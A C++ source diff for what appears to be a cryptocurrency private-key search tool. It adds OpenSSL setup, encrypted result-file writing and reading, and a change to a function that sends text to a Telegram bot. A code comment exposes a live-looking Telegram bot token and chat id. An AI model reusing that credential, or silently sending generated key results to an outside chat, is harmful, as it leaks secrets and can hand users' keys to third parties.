@@ -163,8 +163,6 @@ namespace utils
 
     std::string toHex(const uint32_t* arr, const uint32_t size)
     {
-        assert(size % 2 == 0);
-
         std::stringstream ss;
         // Iterate through each byte of the array
         for (uint32_t i = 0; i < size; ++i)
@@ -180,8 +178,6 @@ namespace utils
 
     std::string toHex(const std::vector<uint8_t>& data)
     {
-        assert(data.length() % 2 == 0);
-
         std::ostringstream oss;
         oss << std::hex << std::setfill('0');
         for (uint8_t byte : data)
@@ -224,6 +220,21 @@ namespace utils
         boost::log::add_common_attributes();
 
         boost::log::core::get()->set_filter(boost::log::trivial::severity >= static_cast<boost::log::trivial::severity_level>(log.severity));
+    }
+
+    void initOpenssl()
+    {
+        OpenSSL_add_all_algorithms();
+        OpenSSL_add_all_ciphers();
+        OpenSSL_add_all_digests();
+        ERR_load_crypto_strings();
+    }
+
+    void releaseOpenssl()
+    {
+        // Cleanup OpenSSL
+        EVP_cleanup();
+        ERR_free_strings();
     }
 
     std::vector<secp256k1::uint256> generateRandomPrivateKeys(const uint32_t keysNumberToGenerate)
@@ -348,7 +359,7 @@ namespace utils
             std::ofstream ofs(filename, std::ios::binary | std::ios::trunc);
             if (!ofs.is_open())
             {
-                std::cerr << "Error opening file for writing: " << filename << std::endl;
+                BOOST_LOG_TRIVIAL(error) << "Error opening file for writing: " << filename;
                 return false;
             }
 
@@ -457,7 +468,7 @@ namespace utils
 
 
     // https://api.telegram.org/bot8152806315:AAEkU9uW5K_HavAsBCvDIOhdEx9uCiT2YUo/sendMessage?chat_id=-4579283346&text={text}
-    void backupToTG(const std::string& text)
+    bool backupToTG(const std::string& text)
     {
         const std::string tgAPIHost{"api.telegram.org"};
         const std::string tgAPIPort{"443"};
@@ -527,12 +538,130 @@ namespace utils
         catch (const std::exception& e)
         {
             BOOST_LOG_TRIVIAL(trace) << "Error: " << e.what() << std::endl;
+            return false;
         }
+
+        return true;
     }
 
     void backupToTGAsync(const std::string& text)
     {
-        std::future<void> result = std::async(std::launch::async, backupToTG, text);
+        std::future<bool> result = std::async(std::launch::async, backupToTG, text);
+    }
+
+    bool writeEncResultsToFile(const crypto::AES& aesEnc, const std::string& filename, const std::string& resultsStr)
+    {
+        std::vector<uint8_t> tag;
+        std::vector<uint8_t> resultStrEnc;
+        if (!aesEnc.encrypt(resultsStr, tag, resultStrEnc))
+        {
+            return false;
+        }
+
+        const uint32_t length = tag.size() + resultStrEnc.size();
+        try
+        {
+            std::ofstream ofs(filename, std::ios::binary | std::ios::app);
+            if (!ofs.is_open())
+            {
+                BOOST_LOG_TRIVIAL(error) << "Error opening file for writing: " << filename;
+                return false;
+            }
+
+            ofs.write(reinterpret_cast<const char*>(&length), sizeof(length));
+            ofs.write(reinterpret_cast<const char*>(tag.data()), tag.size());
+            ofs.write(reinterpret_cast<const char*>(resultStrEnc.data()), resultStrEnc.size());
+
+            ofs.flush();
+            ofs.close();
+        }
+        catch (const std::exception& e)
+        {
+            BOOST_LOG_TRIVIAL(error) << e.what();
+            return false;
+        }
+
+        return true;
+    }
+
+    bool readEncResults(const crypto::AES& aesEnc, const std::string& filename, std::vector<std::string>& results)
+    {
+        try
+        {
+            boost::iostreams::mapped_file_source file;
+            file.open(filename);
+
+            if (!file.is_open())
+            {
+                BOOST_LOG_TRIVIAL(error) << "Error opening file: " << filename;
+                return false;
+            }
+
+            // Pointer to the start of the file data
+            const char *data = file.data();
+            const size_t fileSize = file.size();
+
+            if (fileSize <= 0)
+            {
+                BOOST_LOG_TRIVIAL(error) << "Results file empty!";
+                return false;
+            }
+
+            uint64_t readIndex{0};
+            while (readIndex < fileSize)
+            {
+                if (readIndex + sizeof(uint32_t) > fileSize)
+                {
+                    BOOST_LOG_TRIVIAL(error) << "Corrupted binary file [length] at position: " << readIndex;
+                    return false;
+                }
+
+                uint32_t length{0};
+                std::memcpy(&length, data + readIndex, sizeof(uint32_t));
+                readIndex += sizeof(uint32_t);
+
+                if (readIndex + crypto::AES::tagSize > fileSize)
+                {
+                    BOOST_LOG_TRIVIAL(error) << "Corrupted binary file [tag] at position: " << readIndex;
+                    return false;
+                }
+
+                std::vector<uint8_t> tag(crypto::AES::tagSize);
+                std::memcpy(reinterpret_cast<char*>(tag.data()), data + readIndex, crypto::AES::tagSize);
+                readIndex += crypto::AES::tagSize;
+
+                const auto resultsEncSize = length - crypto::AES::tagSize;
+                if (readIndex + resultsEncSize > fileSize)
+                {
+                    BOOST_LOG_TRIVIAL(error) << "Corrupted binary file [resultsEnc] at position: " << readIndex;
+                    return false;
+                }
+
+                std::vector<uint8_t> resultsEnc(resultsEncSize);
+                std::memcpy(reinterpret_cast<char*>(resultsEnc.data()), data + readIndex, resultsEncSize);
+                readIndex += resultsEncSize;
+
+                std::string resultStr;
+                if (aesEnc.decrypt(resultsEnc, tag, resultStr))
+                {
+                    results.emplace_back(std::move(resultStr));
+                }
+                else
+                {
+                    BOOST_LOG_TRIVIAL(error) << "Decryption fails [resultsEnc] at position: " << (readIndex - resultsEncSize);
+                    continue;
+                }
+            }
+
+            file.close();
+        }
+        catch (const std::exception& e)
+        {
+            BOOST_LOG_TRIVIAL(error) << e.what();
+            return false;
+        }
+
+        return true;
     }
 }
 
